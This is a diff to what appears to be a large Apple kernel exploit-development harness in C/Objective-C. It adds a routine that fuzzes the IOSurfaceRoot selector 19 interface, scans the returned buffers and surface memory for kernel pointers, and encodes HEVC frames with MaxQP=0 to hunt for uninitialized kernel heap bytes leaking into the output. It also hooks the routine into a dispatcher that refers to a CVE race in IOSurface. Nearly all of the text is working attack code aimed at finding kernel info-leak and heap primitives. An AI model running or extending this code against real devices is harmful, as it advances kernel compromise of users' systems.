@@ -27724,6 +27724,369 @@ static void r499_exploit(void) {
     fflush(stdout);
 }
 
+/* ====================================================================
+ * r500: IOSurface selector 19 deep probe + MaxQP=0 extra-byte analysis
+ *
+ * r499 found: sel 19 with 24-byte struct → kr=0 (SUCCESS)
+ * r498 found: MaxQP=0 → 97 bytes output (7 extra bytes vs baseline 90)
+ *
+ * Phase 1: Probe sel 19 with varied struct contents
+ * Phase 2: Analyze MaxQP=0 extra 7 bytes for kernel data leak
+ * Phase 3: IOSurface sel 19 as kernel heap primitive
+ * ==================================================================== */
+
+static void r500_exploit(void) {
+    rlog("\n=== r500: sel19 deep probe + MaxQP=0 extra-byte analysis ===\n\n");
+    fflush(stdout);
+
+    /* Phase 1: Deep probe IOSurface selector 19 */
+    rlog("--- Phase 1: IOSurface sel 19 deep probe ---\n");
+
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    IOObjectRelease(svc);
+    rlog("  conn=0x%x kr=0x%x\n", conn, kr);
+    if (kr != 0) goto r500_done;
+
+    /* Create a surface */
+    CFMutableDictionaryRef sprops = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int w = 64, h = 64, bpe = 4, bpr = 256, pf = 0x42475241;
+    CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef brn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFDictionarySetValue(sprops, CFSTR("IOSurfaceWidth"), wn);
+    CFDictionarySetValue(sprops, CFSTR("IOSurfaceHeight"), hn);
+    CFDictionarySetValue(sprops, CFSTR("IOSurfaceBytesPerElement"), bn);
+    CFDictionarySetValue(sprops, CFSTR("IOSurfaceBytesPerRow"), brn);
+    CFDictionarySetValue(sprops, CFSTR("IOSurfacePixelFormat"), pfn);
+    IOSurfaceRef surf = IOSurfaceCreate(sprops);
+    CFRelease(sprops); CFRelease(wn); CFRelease(hn);
+    CFRelease(bn); CFRelease(brn); CFRelease(pfn);
+    uint32_t sid = IOSurfaceGetID(surf);
+    rlog("  Surface id=%u\n", sid);
+
+    /* 1a: sel19 with different struct sizes */
+    rlog("\n  1a: sel19 struct size sweep:\n");
+    for (int sz = 4; sz <= 64; sz += 4) {
+        uint8_t buf[64] = {0};
+        memcpy(buf, &sid, 4);
+        kr = IOConnectCallMethod(conn, 19, NULL, 0, buf, sz,
+            NULL, NULL, NULL, NULL);
+        rlog("    sel19 struct(%dB): kr=0x%x\n", sz, kr);
+    }
+
+    /* 1b: sel19 with 24-byte struct, varied content */
+    rlog("\n  1b: sel19(24B) content variations:\n");
+    {
+        /* {sid, 0, 0} */
+        uint64_t s1[3] = {sid, 0, 0};
+        kr = IOConnectCallMethod(conn, 19, NULL, 0, s1, 24, NULL, NULL, NULL, NULL);
+        rlog("    {sid, 0, 0}: kr=0x%x\n", kr);
+
+        /* {0, sid, 0} */
+        uint64_t s2[3] = {0, sid, 0};
+        kr = IOConnectCallMethod(conn, 19, NULL, 0, s2, 24, NULL, NULL, NULL, NULL);
+        rlog("    {0, sid, 0}: kr=0x%x\n", kr);
+
+        /* {0, 0, sid} */
+        uint64_t s3[3] = {0, 0, sid};
+        kr = IOConnectCallMethod(conn, 19, NULL, 0, s3, 24, NULL, NULL, NULL, NULL);
+        rlog("    {0, 0, sid}: kr=0x%x\n", kr);
+
+        /* {sid, sid, sid} */
+        uint64_t s4[3] = {sid, sid, sid};
+        kr = IOConnectCallMethod(conn, 19, NULL, 0, s4, 24, NULL, NULL, NULL, NULL);
+        rlog("    {sid,sid,sid}: kr=0x%x\n", kr);
+
+        /* {0, 0, 0} */
+        uint64_t s5[3] = {0, 0, 0};
+        kr = IOConnectCallMethod(conn, 19, NULL, 0, s5, 24, NULL, NULL, NULL, NULL);
+        rlog("    {0, 0, 0}: kr=0x%x\n", kr);
+
+        /* {0xFFFFFFFF, 0, 0} */
+        uint64_t s6[3] = {0xFFFFFFFF, 0, 0};
+        kr = IOConnectCallMethod(conn, 19, NULL, 0, s6, 24, NULL, NULL, NULL, NULL);
+        rlog("    {0xFFFFFFFF, 0, 0}: kr=0x%x\n", kr);
+
+        /* {sid, 1, 0} through {sid, 10, 0} */
+        for (int v = 0; v <= 10; v++) {
+            uint64_t sv[3] = {sid, v, 0};
+            kr = IOConnectCallMethod(conn, 19, NULL, 0, sv, 24, NULL, NULL, NULL, NULL);
+            rlog("    {sid, %d, 0}: kr=0x%x\n", v, kr);
+        }
+    }
+
+    /* 1c: sel19 with output buffer to see what it returns */
+    rlog("\n  1c: sel19 with output:\n");
+    {
+        uint64_t s[3] = {sid, 0, 0};
+        uint64_t sout[8] = {0};
+        uint32_t sout_cnt = 8;
+        size_t sout_struct_sz = 64;
+        uint8_t sout_struct[64] = {0};
+
+        /* scalar output */
+        kr = IOConnectCallMethod(conn, 19, NULL, 0, s, 24,
+            sout, &sout_cnt, NULL, NULL);
+        rlog("    scalar out: kr=0x%x cnt=%u\n", kr, sout_cnt);
+        if (kr == 0 && sout_cnt > 0) {
+            for (uint32_t i = 0; i < sout_cnt; i++)
+                rlog("      out[%d] = 0x%016llx\n", i, (unsigned long long)sout[i]);
+        }
+
+        /* struct output */
+        kr = IOConnectCallMethod(conn, 19, NULL, 0, s, 24,
+            NULL, NULL, sout_struct, &sout_struct_sz);
+        rlog("    struct out: kr=0x%x sz=%zu\n", kr, sout_struct_sz);
+        if (kr == 0 && sout_struct_sz > 0) {
+            rlog("      data:");
+            for (size_t i = 0; i < sout_struct_sz && i < 64; i++)
+                rlog(" %02x", sout_struct[i]);
+            rlog("\n");
+            for (size_t i = 0; i + 7 < sout_struct_sz; i += 8) {
+                uint64_t qw = *(uint64_t*)(sout_struct + i);
+                if (qw != 0) {
+                    rlog("      +%zu: 0x%016llx", i, (unsigned long long)qw);
+                    if ((qw & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                        rlog(" *** KPTR ***");
+                    rlog("\n");
+                }
+            }
+        }
+
+        /* Both */
+        memset(sout, 0, sizeof(sout));
+        memset(sout_struct, 0, sizeof(sout_struct));
+        sout_cnt = 8;
+        sout_struct_sz = 64;
+        kr = IOConnectCallMethod(conn, 19, NULL, 0, s, 24,
+            sout, &sout_cnt, sout_struct, &sout_struct_sz);
+        rlog("    both out: kr=0x%x sc=%u ss=%zu\n", kr, sout_cnt, sout_struct_sz);
+    }
+
+    /* 1d: Call sel 19 many times and check surface state */
+    rlog("\n  1d: Repeated sel19 calls + surface state check:\n");
+    {
+        uint64_t s[3] = {sid, 0, 0};
+        for (int i = 0; i < 100; i++) {
+            s[1] = i;
+            kr = IOConnectCallMethod(conn, 19, NULL, 0, s, 24, NULL, NULL, NULL, NULL);
+        }
+        rlog("    100 calls done, last kr=0x%x\n", kr);
+
+        /* Check if surface properties changed */
+        CFDictionaryRef allVals = IOSurfaceCopyAllValues(surf);
+        if (allVals) {
+            CFIndex cnt = CFDictionaryGetCount(allVals);
+            rlog("    Surface properties after 100 sel19 calls: %ld\n", (long)cnt);
+            CFRelease(allVals);
+        }
+
+        /* Check surface pixel data */
+        IOSurfaceLock(surf, 0, NULL);
+        void *base = IOSurfaceGetBaseAddress(surf);
+        uint64_t *qbase = (uint64_t*)base;
+        int nonzero = 0, kptr = 0;
+        for (int i = 0; i < 2048; i++) {
+            if (qbase[i] != 0) nonzero++;
+            if ((qbase[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                kptr++;
+                if (kptr <= 3)
+                    rlog("    KPTR at base+%d: 0x%016llx\n", i * 8, (unsigned long long)qbase[i]);
+            }
+        }
+        IOSurfaceUnlock(surf, 0, NULL);
+        rlog("    Surface pixel data: %d nonzero qwords, %d kptrs\n", nonzero, kptr);
+    }
+
+    CFRelease(surf);
+    IOServiceClose(conn);
+
+    /* Phase 2: MaxQP=0 extra-byte analysis */
+    rlog("\n--- Phase 2: MaxQP=0 extra-byte deep analysis ---\n");
+    {
+        /* MaxQP=0 produced 97 bytes vs baseline 90 — 7 extra bytes.
+         * Those 7 bytes could contain uninitialized kernel/heap data.
+         * Strategy: Encode many frames with MaxQP=0, compare the extra bytes.
+         * If they vary between frames, they might contain heap data. */
+
+        int trial_count = 20;
+        uint8_t extras[20][16] = {{0}};
+        int extra_lens[20] = {0};
+        int total_extra = 0;
+
+        for (int trial = 0; trial < trial_count; trial++) {
+            VTCompressionSessionRef enc = NULL;
+            CFMutableDictionaryRef espec = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int tw = 128, th = 128;
+            CFNumberRef twn = CFNumberCreate(NULL, kCFNumberIntType, &tw);
+            CFNumberRef thn = CFNumberCreate(NULL, kCFNumberIntType, &th);
+            CFDictionarySetValue(espec, CFSTR("Width"), twn);
+            CFDictionarySetValue(espec, CFSTR("Height"), thn);
+
+            OSStatus st = VTCompressionSessionCreate(NULL, tw, th,
+                kCMVideoCodecType_HEVC, espec, NULL, NULL,
+                r498_encode_callback, NULL, &enc);
+            CFRelease(espec); CFRelease(twn); CFRelease(thn);
+            if (st != 0 || !enc) continue;
+
+            /* Set MaxQP=0 */
+            CFNumberRef zero = CFNumberCreate(NULL, kCFNumberIntType, &(int){0});
+            VTSessionSetProperty(enc, CFSTR("MaxQuantizationParameter"), zero);
+            CFRelease(zero);
+            VTCompressionSessionPrepareToEncodeFrames(enc);
+
+            /* Create pixel buffer */
+            CVPixelBufferRef pb = NULL;
+            NSDictionary *pba = @{(id)kCVPixelBufferWidthKey: @(tw),
+                                  (id)kCVPixelBufferHeightKey: @(th)};
+            CVPixelBufferCreate(NULL, tw, th, kCVPixelFormatType_32BGRA,
+                (__bridge CFDictionaryRef)pba, &pb);
+            CVPixelBufferLockBaseAddress(pb, 0);
+            memset(CVPixelBufferGetBaseAddress(pb), (trial * 7) & 0xFF,
+                   CVPixelBufferGetDataSize(pb));
+            CVPixelBufferUnlockBaseAddress(pb, 0);
+
+            /* Encode */
+            CMTime pts = CMTimeMake(trial, 30);
+            r498_outlen = 0;
+            VTCompressionSessionEncodeFrame(enc, pb, pts, kCMTimeInvalid, NULL, NULL, NULL);
+            VTCompressionSessionCompleteFrames(enc, kCMTimePositiveInfinity);
+
+            if (r498_outlen > 90) {
+                int extra = r498_outlen - 90;
+                extra_lens[trial] = extra;
+                memcpy(extras[trial], r498_outbuf + 90, extra < 16 ? extra : 16);
+                total_extra++;
+            }
+
+            VTCompressionSessionInvalidate(enc);
+            CFRelease(enc);
+            CVPixelBufferRelease(pb);
+        }
+
+        rlog("  Trials with extra bytes: %d/%d\n", total_extra, trial_count);
+
+        if (total_extra > 1) {
+            rlog("  Extra byte comparison (offset 90+):\n");
+            int varies = 0;
+            for (int i = 0; i < 16; i++) {
+                int min = 255, max = 0, count = 0;
+                for (int t = 0; t < trial_count; t++) {
+                    if (extra_lens[t] > i) {
+                        uint8_t b = extras[t][i];
+                        if (b < min) min = b;
+                        if (b > max) max = b;
+                        count++;
+                    }
+                }
+                if (count > 1) {
+                    rlog("    byte[%d]: min=0x%02x max=0x%02x range=%d%s\n",
+                         i, min, max, max - min,
+                         (min != max) ? " *** VARIES ***" : "");
+                    if (min != max) varies++;
+                }
+            }
+            rlog("  %d byte positions vary across trials\n", varies);
+
+            /* Dump all extra byte arrays for comparison */
+            rlog("  Raw extra bytes per trial:\n");
+            for (int t = 0; t < trial_count; t++) {
+                if (extra_lens[t] > 0) {
+                    rlog("    trial%02d (%dB):", t, extra_lens[t]);
+                    for (int i = 0; i < extra_lens[t] && i < 16; i++)
+                        rlog(" %02x", extras[t][i]);
+                    rlog("\n");
+                }
+            }
+        }
+
+        /* Phase 2b: MaxQP=0 with varied pixel data to isolate entropy source */
+        rlog("\n  Phase 2b: MaxQP=0 with identical pixel data:\n");
+        {
+            uint8_t same_extras[5][16] = {{0}};
+            int same_extra_lens[5] = {0};
+            for (int trial = 0; trial < 5; trial++) {
+                VTCompressionSessionRef enc = NULL;
+                CFMutableDictionaryRef espec = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int tw = 128, th = 128;
+                CFNumberRef twn = CFNumberCreate(NULL, kCFNumberIntType, &tw);
+                CFNumberRef thn = CFNumberCreate(NULL, kCFNumberIntType, &th);
+                CFDictionarySetValue(espec, CFSTR("Width"), twn);
+                CFDictionarySetValue(espec, CFSTR("Height"), thn);
+
+                VTCompressionSessionCreate(NULL, tw, th,
+                    kCMVideoCodecType_HEVC, espec, NULL, NULL,
+                    r498_encode_callback, NULL, &enc);
+                CFRelease(espec); CFRelease(twn); CFRelease(thn);
+                if (!enc) continue;
+
+                CFNumberRef zero = CFNumberCreate(NULL, kCFNumberIntType, &(int){0});
+                VTSessionSetProperty(enc, CFSTR("MaxQuantizationParameter"), zero);
+                CFRelease(zero);
+                VTCompressionSessionPrepareToEncodeFrames(enc);
+
+                CVPixelBufferRef pb = NULL;
+                NSDictionary *pba = @{(id)kCVPixelBufferWidthKey: @128,
+                                      (id)kCVPixelBufferHeightKey: @128};
+                CVPixelBufferCreate(NULL, 128, 128, kCVPixelFormatType_32BGRA,
+                    (__bridge CFDictionaryRef)pba, &pb);
+                CVPixelBufferLockBaseAddress(pb, 0);
+                memset(CVPixelBufferGetBaseAddress(pb), 0x80,
+                       CVPixelBufferGetDataSize(pb));
+                CVPixelBufferUnlockBaseAddress(pb, 0);
+
+                r498_outlen = 0;
+                VTCompressionSessionEncodeFrame(enc, pb, CMTimeMake(0, 30),
+                    kCMTimeInvalid, NULL, NULL, NULL);
+                VTCompressionSessionCompleteFrames(enc, kCMTimePositiveInfinity);
+
+                if (r498_outlen > 90) {
+                    same_extra_lens[trial] = r498_outlen - 90;
+                    memcpy(same_extras[trial], r498_outbuf + 90,
+                           same_extra_lens[trial] < 16 ? same_extra_lens[trial] : 16);
+                }
+                rlog("    trial%d: len=%d\n", trial, r498_outlen);
+
+                VTCompressionSessionInvalidate(enc);
+                CFRelease(enc);
+                CVPixelBufferRelease(pb);
+            }
+
+            /* Compare */
+            int identical = 1;
+            for (int t = 1; t < 5; t++) {
+                if (same_extra_lens[t] != same_extra_lens[0] ||
+                    memcmp(same_extras[t], same_extras[0], same_extra_lens[0]) != 0) {
+                    identical = 0;
+                    break;
+                }
+            }
+            rlog("    Same-pixel extra bytes: %s\n",
+                 identical ? "IDENTICAL (deterministic)" : "DIFFER (heap/entropy leak!)");
+            if (!identical) {
+                for (int t = 0; t < 5; t++) {
+                    rlog("      t%d:", t);
+                    for (int i = 0; i < same_extra_lens[t] && i < 16; i++)
+                        rlog(" %02x", same_extras[t][i]);
+                    rlog("\n");
+                }
+            }
+        }
+    }
+
+r500_done:
+    rlog("\n=== r500 complete ===\n");
+    fflush(stdout);
+}
+
 static void r498_exploit(void) {
     rlog("\n=== r498: Bitstream comparison + PropertyMode ===\n\n");
     fflush(stdout);
@@ -98423,6 +98786,12 @@ new_modes:
             r484_exploit();
             goto done;
         }
+        if (rounds == 504) {
+            rlog("*** rounds=504: sel19 deep probe + MaxQP=0 extra-byte analysis ***\n\n");
+            fflush(stdout);
+            r500_exploit();
+            goto done;
+        }
         if (rounds == 503) {
             rlog("*** rounds=503: CVE-2026-112477 IOSurface sel 17/18 race ***\n\n");
             fflush(stdout);
@@ -101450,7 +101819,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 503 && rounds != 502 && rounds != 501 && rounds != 500 && rounds != 499 && rounds != 498 && rounds != 497 && rounds != 496 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 504 && rounds != 503 && rounds != 502 && rounds != 501 && rounds != 500 && rounds != 499 && rounds != 498 && rounds != 497 && rounds != 496 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
